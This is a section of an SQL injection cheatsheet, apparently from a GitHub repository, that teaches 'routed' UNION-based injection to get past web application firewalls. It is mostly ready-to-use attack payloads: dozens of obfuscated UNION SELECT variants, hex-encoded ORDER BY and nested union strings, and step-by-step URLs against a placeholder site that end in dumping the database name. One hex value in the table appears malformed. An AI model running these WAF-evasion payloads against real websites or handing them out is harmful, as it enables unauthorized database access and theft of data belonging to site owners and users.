## Routed queries (advaced WAF bypass)
If the WAF is very hard to bypass using the given queries, the routed ones might help you.

## Identifying how many columns the payload has

```http://domain.com/index.php?id=-1 Union Select 0x3127,2,3,4``` 0x3127 = 1' (0xHEX converted)  
```http://domain.com/index.php?id=-1 Union Select 1,0x3227,3,4``` 0x3227 = 2' (0xHEX converted)  
```http://domain.com/index.php?id=-1 Union Select 1,2,0x3327,4``` 0x3327 = 3' (0xHEX converted)  
```http://domain.com/index.php?id=-1 Union Select 1,2,3,0x3427``` 0x3427 = 4' (0xHEX converted)  

If any of the payloads gives error, it means that the respective column number is vulnerable to be dumped, for example. In our case, the second payload gives error, which means, we can start dumping the second column.

If the website has WAF enabled, you can use the following WAF-based UNION queries. Simply replace ```Union Select``` with the following payloads:  

```
/*!50000%55nIoN*/ /*!50000%53eLeCt*/  
%55nion(%53elect 1,2,3)  
union+distinctROW+select+1,2,3,4-- -  
#?uNiOn + #?sEleCt  
#?1q %0AuNiOn all#qa%0A#%0AsEleCt  
/*!%55NiOn*/ /*!%53eLEct*/  
+un/**/ion+se/**/lect  
+?UnI?On?+'SeL?ECT?  
(UnIoN)+(SelECT)+1,2,3,4-- -  
+UnIoN/*&a=*/SeLeCT/*&a=*/  
%55nion(%53elect 1,2,3,4)-- -  
/**//*!12345UNION SELECT*//**/  
/**//*!50000UNION SELECT*//**/  
/**/UNION/**//*!50000SELECT*//**/  
/*!50000UniON SeLeCt*/  
union /*!50000%53elect*/  
/*!u%6eion*/ /*!se%6cect*/  
/*--*/union/*--*/select/*--*/  
union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
/*!union*/+/*!select*/  
/**/uNIon/**/sEleCt/**/  
+%2F**/+Union/*!select*/  
/**//*!union*//**//*!select*//**/  
/*!uNIOn*/ /*!SelECt*/  
/**/union/*!50000select*//**/  
0%a0union%a0select%09  
%0Aunion%0Aselect%0A  
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/  
/*!union*//*--*//*!all*//*--*//*!select*/  
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
+UnIoN/*&a=*/SeLeCT/*&a=*/  
union+sel%0bect  
+#1q%0Aunion all#qa%0A#%0Aselect  
%23xyz%0AUnIOn%23xyz%0ASeLecT+  
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+  
union(select(1),2,3)
uNioN (/*!/**/ SeleCT */ 11)  
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/  
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/  
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C  
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/  
+UnIoN/*&a=*/SeLeCT/*&a=*/  
+/*!UnIoN*/+/*!SeLeCt*/+  
/*!u%6eion*/ /*!se%6cect*/  
uni%20union%20/*!select*/%20  
union%23aa%0Aselect  
/**/union/*!50000select*/  
/^****union.*$/ /^****select.*$/  
/*union*/union/*select*/select+  
/*!50000UnION*//*!50000SeLeCt*/  
%252f%252a*/union%252f%252a /select%252f%252a*/  
```

In this case I used the first payload ```/*!50000%55nIoN*/ /*!50000%53eLeCt*/```, so the final payload would be:  
```http://domain.com/index.php?id=-1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,0x3227,3,4```  
The payload bypasses WAF and gives SQL Error, which means the 2nd column is vulnerable to be dumped.  

## Finding the amount of columns (ORDER BY)

Since we know the second column was vulnerable, we are going to dump it using ORDER BY queries.  

Below are Union Distincs queries, which we can use for further enumerating:

```
and 0e0union distinctROW select 1,2,3,4  
and .0unIon distincrOw /*!50000sElect*/ 1,2,3,4  
AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4  
'-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4  
.0union distinct/**_**/Select 1,2,3,4  
union distinct selec%54 1,2,3,4  
UniOn DISTINCTROW sEleCt 1,2,3,4  
+union+distinct+select+1,2,3,4  
+union+distinctROW+select+1,2,3,4  
```

In our case the following payload does the job:  
```http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4```  

Replacing the number, so the final payload would be:  
```http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x32204f524445522042592031,3,4```  where 0x32204f524445522042592031 = 2 ORDER BY 1 (0xHEX converted)  

The payload musn't show error. Keep increasing the number by 1 until you see an error. Replace the 0xHEX value on the payload with the following hex, until you will receive an error.

```
2 ORDER BY 1 -> 0x32204f524445522042592031  
2 ORDER BY 2 -> 0x32204f524445522042592032  
2 ORDER BY 3 -> 0x32204f524445522042592033  
2 ORDER BY 4 -> 0x32204f524445522042592034  
2 ORDER BY 5 -> 0x32204f524445522042592035  
2 ORDER BY 6 -> 0x32204f524445522042592036  
2 ORDER BY 7 -> 0x32204f524445522042592037  
2 ORDER BY 8 -> 0x32204f524445522042592038  
```
and so on...

In our case, **2 ORDER BY 8** is the smallest number which gives an SQL Syntax error, which means the database has 7 columns.

## Finding the number of column to dump data

The following queries are called **Union Distinct Rows** queries. Because the 7th column is vulnerable, we will add number 7 in front of each payload:

| Union Distinct Rows queries                                       | Queries converted to 0xHEX |
| ----------------------------------------------------------------- | -------------------------- |
| 2 and 0e0union distinctROW select 1,2,3,4,5,6,7                   | 0x3720616e6420306530756e696f6e2064697374696e6374524f572073656c65637420312c322c332c342c352c362c37  |
| 2 and .0unIon distincrOw /*!50000sElect*/ 1,2,3,4,5,6,7           | 0x3720616e64202e30756e496f6e2064697374696e63724f77202f2a21353030303073456c6563742a2f20312c322c332c342c352c362c37  |
| 2 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,6,7  | 0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c362c37 |
| 2 '-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4,5,6,7 | 0x3720272d2c31756e696f6e2064697374696e6374726f772532336161616161616161616161616161612530612073656c65637420312c322c332c342c352c362c37 |
| ```2 .0union distinct/**_**/Select 1,2,3,4,5,6,7```               | 0x37202e30756e696f6e2064697374696e63742f2a2a5f2a2a2f53656c65637420312c322c332c342c352c362c37 |
| 2 union distinct selec%54 1,2,3,4,5,6,7                           | 0xa3720756e696f6e2064697374696e63742073656c656325353420312c322c332c342c352c362c37 |
| 2 UniOn DISTINCTROW sEleCt 1,2,3,4,5,6,7                          | 0x3720556e694f6e2044495354494e4354524f572073456c65437420312c322c332c342c352c362c37 |
| 2+union+distinct+select+1,2,3,4,5,6,7                             | 0x372b756e696f6e2b64697374696e63742b73656c6563742b312c322c332c342c352c362c37 |
| 2+union+distinctROW+select+1,2,3,4,5,6,7                          | 0x372b756e696f6e2b64697374696e6374524f572b73656c6563742b312c322c332c342c352c362c37 |

In our case I will use the 3rd payload, so copy the 0xHEX converted payload and use it in the following payload:  
```http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c362c37,3,4```  

On the response, a number will be displayed, which tells us the vulnerable column. In this case, number 6 is vulnerable.

## Dumping data from the column

Because we used the payload ```2 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,6,7```, and because the number 6 was vulnerable (on the website response), our next payload will be (simply replace number 6 with concat(), DIOS, or simple dumping queries):

```2 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,database(),7```

Convert it to 0xHEX and paste in in the next payload:  

```http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c646174616261736528292c37,3,4``` 

We successfuly dumped the database name.

I am using **database()**, because I want to keep the cheatsheet as easy as possible, however you can use [DIOS Payloads](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Error%20Based%20SQLi#dumping-with-dios). The technique is the same, but in the end, convert the whole payload to 0xHEX.
